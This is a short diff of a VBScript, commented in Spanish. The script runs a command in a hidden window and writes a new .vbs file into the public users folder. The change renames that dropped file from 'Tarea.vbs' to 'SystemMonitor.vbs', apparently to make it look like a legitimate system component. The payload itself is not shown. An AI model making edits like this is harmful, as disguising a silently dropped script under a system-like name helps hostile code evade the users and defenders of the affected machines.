@@ -23,7 +23,7 @@
     objShell.Run cmdCrear, 0, True
 
     carpetaRand = "C:\Users\Public\"
-    archivoRand = "Tarea.vbs"
+    archivoRand = "SystemMonitor.vbs"  ' ← CAMBIO AQUÍ: de Tarea.vbs a SystemMonitor.vbs
 
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set archivo = fso.CreateTextFile(carpetaRand & archivoRand, True)
